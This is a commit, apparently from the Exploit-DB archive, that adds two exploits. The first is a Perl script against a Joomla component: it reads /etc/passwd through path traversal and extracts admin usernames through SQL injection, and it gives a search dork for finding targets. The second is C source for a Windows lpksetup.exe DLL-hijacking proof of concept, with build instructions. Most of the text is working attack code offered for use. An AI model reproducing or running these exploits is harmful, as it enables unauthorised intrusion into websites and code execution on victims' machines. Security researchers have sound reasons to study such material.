174997aa11f064904f22d2bd054fa0f332754b10
Offensive Security <info@exploit-db.com>
2014-10-12 04:43:47 +0000

    Updated 10_12_2014

---
+++ platforms/php/webapps/34934.pl
@@ -0,0 +1,139 @@
+source: http://www.securityfocus.com/bid/44456/info
+
+The 'com_projects' component for Joomla! is prone to an SQL-injection vulnerability and a local file-include vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker can exploit these vulnerabilities to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. By using directory-traversal strings to execute local script code in the context of the application, the attacker may be able to obtain sensitive information that may aid in further attacks. 
+
+=========================================================
+Joomla  Component com_projects LFI & SQL Vulnerability
+=========================================================
+
+[+]Title        : Joomla  Component com_calendrier RFI Vulnerability
+[+]Author       : jos_ali_joe
+[+]Contact      : josalijoe@yahoo.com
+[+]Home 	: http://josalijoe.wordpress.com/		
+######################################################################## 
+Dork		: inurl:index.php?option="com_projects"
+######################################################################## 
+[ Software Information ]
+########################################################################
+[+] Vendor : http://www.codegravity.com/
+[+] Download : http://www.joomla.org/download.html
+[+] version : Joomla 1.5
+[+] Vulnerability : LFI and SQL Vulnerability
+[+] Dork : com_projects
+########################################################################
+[+] Exploit: LFI
+====================================================================================
+http://localhost/index.php?option=com_projects&controller=[ LFI ]
+====================================================================================
+use LWP::UserAgent;
+use HTTP::Request;
+use LWP::Simple;
+
+print "\t\t########################################################\n\n";
+print "\t\t#    Joomla  Component com_projects LFI Vulnerability  #\n\n";
+print "\t\t#                        by jos_ali_joe                #\n\n";
+print "\t\t########################################################\n\n";
+
+
+if (!$ARGV[0])
+{
+print "Usage: perl idc.pl [HOST]\n";
+print "Example: perl idc.pl http://localhost/LFI/\n";;
+}
+
+else
+{
+
+$web=$ARGV[0];
+chomp $web;
+
+$iny="agregar_info.php?tabla=../../../../../../../../../../../../../../../../etc/passwd%00";
+
+my $web1=$web.$iny;
+print "$web1\n\n";
+my $ua = LWP::UserAgent->new;
+my $req=HTTP::Request->new(GET=>$web1);
+$doc = $ua->request($req)->as_string;
+
+if ($doc=~ /^root/moxis ){
+print "Web is vuln\n";
+}
+else
+{
+print "Web is not vuln\n";
+}
+
+}
+
+####################################################################################
+[+] Exploit: SQL
+====================================================================================
+http://localhost/index.php?option=com_projects&view=project&id=[ SQL ]
+====================================================================================
+use IO::Socket;
+if(@ARGV < 1){
+print "
+[========================================================================
+[//   Joomla Component com_projects SQL Injection Exploit
+[//                   Usage: idc.pl [target]
+[//                   Example: idc.pl localhost.com
+[//                   Vuln&Exp : jos_ali_joe
+[========================================================================
+";
+exit();
+}
+#Local variables
+$server = $ARGV[0];
+$server =~ s/(http:\/\/)//eg;
+$host = "http://".$server;
+$port = "80";
+$file = "/index.php?option=com_projects&view=project&id=";
+ 
+print "Script <DIR> : ";
+$dir = <STDIN>;
+chop ($dir);
+ 
+if ($dir =~ /exit/){
+print "-- Exploit Failed[You Are Exited] \n";
+exit();
+}
+ 
+if ($dir =~ /\//){}
+else {
+print "-- Exploit Failed[No DIR] \n";
+exit();
+ }
+ 
+ 
+$target = "SQL Injection Exploit";
+$target = $host.$dir.$file.$target;
+ 
+#Writing data to socket
+print "+**********************************************************************+\n";
+print "+ Trying to connect: $server\n";
+$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
+print $socket "GET $target HTTP/1.1\n";
+print $socket "Host: $server\n";
+print $socket "Accept: * /*\n";
+print $socket "Connection: close\n\n";
+print "+ Connected!...\n";
+#Getting
+while($answer = <$socket>) {
+if ($answer =~ /username:(.*?)pass/){
+print "+ Exploit succeed! Getting admin information.\n";
+print "+ ---------------- +\n";
+print "+ Username: $1\n";
+}
+
+####################################################################################
+Thanks :
+./kaMtiEz ? ibl13Z ? Xrobot ? tukulesto ? R3m1ck ? jundab - asickboys- Vyc0d ? Yur4kha - XPanda - eL Farhatz
+./ArRay ? akatsuchi ? K4pt3N ? Gameover ? antitos ? yuki ? pokeng ? ffadill - Alecs - v3n0m - RJ45
+./Kiddies ? pL4nkt0n ? chaer newbie ? andriecom ? Abu_adam ? Petimati - hakz ? Virgi ? Anharku - a17z a.k.a maho
+./Me Family ATeN4 :
+./N4ck0 - Aury - TeRRenJr - Rafael - aphe-aphe 
+Greets For :
+./Devilzc0de crew ? Kebumen Cyber ? Explore Crew ? Indonesian Hacker - Byroe Net - Yogyacarderlink - Hacker Newbie - Jatim Crew - Malang Cyber
+My Team : ./Indonesian Coder
---
+++ platforms/windows/remote/34931.c
@@ -0,0 +1,57 @@
+source: http://www.securityfocus.com/bid/44414/info
+
+Microsoft Windows 'lpksetup.exe' is prone to a vulnerability that lets attackers execute arbitrary code.
+
+An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file. 
+
+/*
+Exploit:       Windows Vista/7 lpksetup.exe (oci.dll) DLL Hijacking
+Vulnerability
+Extension:  .mlc
+Author:       Tyler Borland (tborland1@gmail.com)
+Date:          10/20/2010
+Tested on:  Windows 7 Ultimate (Windows Vista Ultimate/Enterpries and
+Windows 7 Enterprise should be vulnerable as well)
+Effect:        Remote Code Execution
+
+lpksetup is the language pack installer that is included by default with
+Windows Vista/7 Ultimate or Enterprise editions.  By opening a .mlc file
+through something like an open SMB or WebDav share, the oci.dll file will be
+grabbed and ran in the context of the vulnerable application.
+
+This is a LoadLibrary() load path bug.  The load library search order is:
+   1. The directory from which the application loaded
+   2. 32-bit System directory (Windows\System32)
+   3. 16-bit System directory (Windows\System)
+   4. Windows directory (Windows)
+   5. Current working directory
+   6. Directories in the PATH environment variable
+As OracleOciLib is not used on target system, oci.dll does not exist, so if
+a full path is not supplied when calling the dll or the search path has not
+been cleared before the call, we will hit our fifth search path and load the
+library from the remote filesystem.
+
+Interestingly enough, while lpksetup is blocked for execution by UAC under a
+normal user, the injected library (payload) will still execute.
+Exploiters make sure your system's security policy, secpol.msc, allows
+complete anonymous share access for connecting users.
+Outlook links seem to be the current exploit toyland, other vectors:
+http://www.binaryplanting.com/attackVectors.htm
+*/
+
+#include <windows.h>
+
+int main()
+{
+  WinExec("calc", SW_NORMAL);  // the typical non-lethal PoC
+  exit(0);
+  return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+  main();
+  return 0;
+}
+
+/* ~/.wine/drive_c/MinGW/bin/wine gcc.exe lpksetup.c -o oci.dll */
